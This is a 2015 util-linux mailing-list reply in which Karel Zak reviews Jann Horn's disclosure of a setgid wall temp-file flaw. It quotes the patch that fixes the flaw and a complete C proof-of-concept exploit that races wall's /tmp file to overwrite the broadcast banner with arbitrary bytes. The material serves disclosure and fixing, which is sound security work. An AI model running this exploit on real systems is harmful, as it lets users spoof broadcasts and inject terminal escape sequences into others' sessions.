Return-Path: util-linux-owner@vger.kernel.org
Received: from mx1.redhat.com ([209.132.183.28]:33652 "EHLO mx1.redhat.com"
	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
	id S1751897AbbC3Jot (ORCPT <rfc822;util-linux@vger.kernel.org>);
	Mon, 30 Mar 2015 05:44:49 -0400
Date: Mon, 30 Mar 2015 11:44:47 +0200
From: Karel Zak <kzak@redhat.com>
To: Jann Horn <jann@thejh.net>
Cc: util-linux@vger.kernel.org
Subject: Re: util-linux: wall security issue: unprivileged users can suppress
 banner
Message-ID: <20150330094447.GR1749@ws.net.home>
References: <20150327182707.GA9561@pc.thejh.net>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
In-Reply-To: <20150327182707.GA9561@pc.thejh.net>
Sender: util-linux-owner@vger.kernel.org
List-ID: <util-linux.vger.kernel.org>

On Fri, Mar 27, 2015 at 07:27:07PM +0100, Jann Horn wrote:
> I found a (tiny) security issue in wall that an unprivileged user can use
> to suppress the banner and send arbitrary bytes (and thereby mess up other
> people's terminals with colors and stuff). Do you want to treat this as a
> security issue and keep it private until a fix is released or should I
> resend this message to util-linux@vger.kernel.org?

I think we can discus it publicly, it does not seem like fatal
security issue, from my point of view it seems like security
disadvantage :-) 

Note that I'm not sure how often is wall installed with setgid, for
example on Fedora only superuser can write to another terminals.

(See below for patch review.)

    Karel


> wall normally runs setgid, but not setuid. This means that any file
> created by wall is accessible for the user running wall. wall writes the
> banner and filtered input from the user to a temporary file, then writes
> data from the temporary file to everyone's terminals without further
> filtering. This means that the user can bypass the filtering by writing
> to the temporary file directly.
[...]

> From 96d238cad0151a4cd271ab38d1f47a82c58dc313 Mon Sep 17 00:00:00 2001
> From: Jann Horn <jann@thejh.net>
> Date: Fri, 27 Mar 2015 19:13:09 +0100
> Subject: [PATCH] fix wall: Do not use a temporary file.
> 
> The issue with using a temporary file in wall is that wall runs as setgid.
> This means that an unprivileged user who runs wall can modify wall's
> temporary files, even if those are mode 0600, so the unprivileged user can
> edit and effectively suppress the banner.
> The fix is to simply not use temporary files.
> ---
>  term-utils/wall.c | 80 ++++++++++++++++++++++++++++++++-----------------------
>  1 file changed, 47 insertions(+), 33 deletions(-)
> 
> diff --git a/term-utils/wall.c b/term-utils/wall.c
> index 387594c..666b4b0 100644
> --- a/term-utils/wall.c
> +++ b/term-utils/wall.c
> @@ -181,14 +181,42 @@ int main(int argc, char **argv)
>  	exit(EXIT_SUCCESS);
>  }
>  
> +static void buf_append(char *data, char **buf, size_t *size, size_t *used)
> +{
> +	size_t data_len = strlen(data);
> +	while (data_len > *size - *used) {
> +		*size = 2 * *size;

 How do you know that "2 * size" is enough for data_len?

> +		*buf = xrealloc(*buf, *size + 1);
> +	}
> +	strcpy(*buf + *used, data);
> +	*used += data_len;
> +}
> +
> +static void buf_append_careful(int c, char **buf, size_t *size, size_t *used)
> +{
> +	char cbuf[10];
> +
> +	if (isprint(c) || c == '\a' || c == '\t' || c == '\r' || c == '\n')
> +		sprintf(cbuf, "%c", c);
> +	else if (!isascii(c))
> +		sprintf(cbuf, "\\%3o", (unsigned char)c);
> +	else {
> +		cbuf[0] = '^';
> +		cbuf[1] = c ^ 0x40;
> +		cbuf[2] = '\0';
> +	}
> +	buf_append(cbuf, buf, size, used);
> +}
> +
>  static char *makemsg(char *fname, char **mvec, int mvecsz,
>  		     size_t *mbufsize, int print_banner)
>  {
>  	register int ch, cnt;
> -	struct stat sbuf;
> -	FILE *fp;
> -	char *p, *lbuf, *tmpname, *mbuf;
> +	char *p, *lbuf;
>  	long line_max;
> +	char headerbuf[TERM_WIDTH + 20];

btw, we have get_terminal_width() in "ttyutils.h"

> +	size_t buf_used = 0, buf_size = 1024;
> +	char *buf = xmalloc(buf_size + 1);
>  
>  	line_max = sysconf(_SC_LINE_MAX);
>  	if (line_max <= 0)
> @@ -196,11 +224,6 @@ static char *makemsg(char *fname, char **mvec, int mvecsz,
>  
>  	lbuf = xmalloc(line_max);
>  
> -	if ((fp = xfmkstemp(&tmpname, NULL)) == NULL)
> -		err(EXIT_FAILURE, _("can't open temporary file"));

if you replace xfmkstemp() with open_memstream() than you don't need
all the buf_append() changes. libc is able to use FILE as in memory
buffer for fprintf-like function :-)

> -	unlink(tmpname);
> -	free(tmpname);
> -
>  	if (print_banner == TRUE) {
>  		char *hostname = xgethostname();
>  		char *whom, *where, *date;
> @@ -233,14 +256,17 @@ static char *makemsg(char *fname, char **mvec, int mvecsz,
>  		 */
>  		/* snprintf is not always available, but the sprintf's here
>  		   will not overflow as long as %d takes at most 100 chars */
> -		fprintf(fp, "\r%*s\r\n", TERM_WIDTH, " ");
> +		sprintf(headerbuf, "\r%*s\r\n", TERM_WIDTH, " ");
> +		buf_append(headerbuf, &buf, &buf_size, &buf_used);
>  		sprintf(lbuf, _("Broadcast message from %s@%s (%s) (%s):"),
>  			      whom, hostname, where, date);
> -		fprintf(fp, "%-*.*s\007\007\r\n", TERM_WIDTH, TERM_WIDTH, lbuf);
> +		sprintf(headerbuf, "%-*.*s\007\007\r\n", TERM_WIDTH, TERM_WIDTH, lbuf);

it would be probably better to use 

        snprintf(headerbuf, sizeof(headerbuf), ....)

or use the real terminal width than sizeof().

> +		buf_append(headerbuf, &buf, &buf_size, &buf_used);
>  		free(hostname);
>  		free(date);
>  	}
> -	fprintf(fp, "%*s\r\n", TERM_WIDTH, " ");
> +	sprintf(headerbuf, "%*s\r\n", TERM_WIDTH, " ");
> +	buf_append(headerbuf, &buf, &buf_size, &buf_used);
>  
>  	 if (mvec) {
>  		/*
> @@ -249,12 +275,11 @@ static char *makemsg(char *fname, char **mvec, int mvecsz,
>  		int i;
>  
>  		for (i = 0; i < mvecsz; i++) {
> -			fputs(mvec[i], fp);
> +			buf_append(mvec[i], &buf, &buf_size, &buf_used);
>  			if (i < mvecsz - 1)
> -				fputc(' ', fp);
> +				buf_append(" ", &buf, &buf_size, &buf_used);
>  		}
> -		fputc('\r', fp);
> -		fputc('\n', fp);
> +		buf_append("\r\n", &buf, &buf_size, &buf_used);
>  
>  	} else {
>  		/*
> @@ -284,33 +309,22 @@ static char *makemsg(char *fname, char **mvec, int mvecsz,
>  			for (cnt = 0, p = lbuf; (ch = *p) != '\0'; ++p, ++cnt) {
>  				if (cnt == TERM_WIDTH || ch == '\n') {
>  					for (; cnt < TERM_WIDTH; ++cnt)
> -						putc(' ', fp);
> -					putc('\r', fp);
> -					putc('\n', fp);
> +						buf_append(" ", &buf, &buf_size, &buf_used);
> +					buf_append("\r\n", &buf, &buf_size, &buf_used);
>  					cnt = 0;
>  				}
>  				if (ch == '\t')
>  					cnt += (7 - (cnt % 8));
>  				if (ch != '\n')
> -					fputc_careful(ch, fp, '^');
> +					buf_append_careful(ch, &buf, &buf_size, &buf_used);
>  			}
>  		}
>  	}
> -	fprintf(fp, "%*s\r\n", TERM_WIDTH, " ");
> +	sprintf(headerbuf, "%*s\r\n", TERM_WIDTH, " ");
> +	buf_append(headerbuf, &buf, &buf_size, &buf_used);
>  
>  	free(lbuf);
> -	rewind(fp);
> -
> -	if (fstat(fileno(fp), &sbuf))
> -		err(EXIT_FAILURE, _("stat failed"));
> -
> -	*mbufsize = (size_t) sbuf.st_size;
> -	mbuf = xmalloc(*mbufsize);
> -
> -	if (fread(mbuf, 1, *mbufsize, fp) != *mbufsize)
> -		err(EXIT_FAILURE, _("fread failed"));
>  
> -	if (close_stream(fp) != 0)
> -		errx(EXIT_FAILURE, _("write error"));
> -	return mbuf;
> +	*mbufsize = buf_used;
> +	return buf;
>  }
> -- 
> 2.1.4
> 

> #include <unistd.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <dirent.h>
> #include <fcntl.h>
> #include <signal.h>
> #include <time.h>
> #include <sys/stat.h>
> #include <sys/types.h>
> 
> static long long nanotime(void) {
>   struct timespec t;
>   clock_gettime(CLOCK_MONOTONIC_COARSE, &t);
>   return t.tv_sec * 1000000000 + t.tv_nsec;
> }
> 
> int main(int argc, char **argv) {
>   if (argc < 2) {
>     puts("usage: ./wallsploit <path to wall>");
>     return 1;
>   }
>   char *wallpath = argv[1];
> 
> again:
>   puts("trying...");
>   int fds[2];
>   if (pipe(fds)) return puts("pipe failed"), 1;
>   pid_t child = fork();
>   if (child < 0) return puts("fork failed"), 1;
>   if (child == 0) {
>     close(fds[1]);
>     if (dup2(fds[0], 0) != 0) return puts("dup2 failed"), 1;
>     close(fds[0]);
>     execlp(wallpath, "wall", NULL);
>     return puts("execlp failed"), 1;
>   }
>   close(fds[0]);
>   long long end = nanotime() + 100000000;
>   if (chdir("/tmp")) return puts("chdir failed"), 1;
>   DIR *d = opendir(".");
>   int n = 0;
>   do {
>     if (++n >= 1000) n = 0;
>     struct dirent *dent;
>     while ((dent = readdir(d))) {
>       if (strncmp(dent->d_name, "wall.", 5) == 0) {
>         int fd = open(dent->d_name, O_RDWR);
>         if (fd >= 0) {
>           puts("got fd!");
>           usleep(10000);
>           struct stat orig_stat, new_stat;
>           if (fstat(fd, &orig_stat)) return puts("fstat"), 1;
>           while (1) {
>             if (write(fds[1], "\n", 1) != 1) return puts("writing padding"), 1;
>             usleep(10000);
>             if (fstat(fd, &new_stat)) return puts("fstat"), 1;
>             if (orig_stat.st_size != new_stat.st_size) {
>               puts("padding complete");
>               ftruncate(fd, 0);
>               char c;
>               while (read(0, &c, 1) == 1) {
>                 if (write(fd, &c, 1) != 1) return puts("writing data"), 1;
>               }
>               puts("overwrite done, letting wall finish...");
>               close(fds[1]);
>               wait(NULL);
>               return 0;
>             }
>           };
>         }
>         puts("saw dentry, but too late :(");
>       }
>     }
>     rewinddir(d);
>   } while (n == 0 || nanotime() < end);
>   if (kill(child, SIGTERM)) return puts("can't kill"), 1;
>   wait(NULL);
>   close(fds[1]);
>   goto again;
>   return 0;
> }



-- 
 Karel Zak  <kzak@redhat.com>
 http://karelzak.blogspot.com
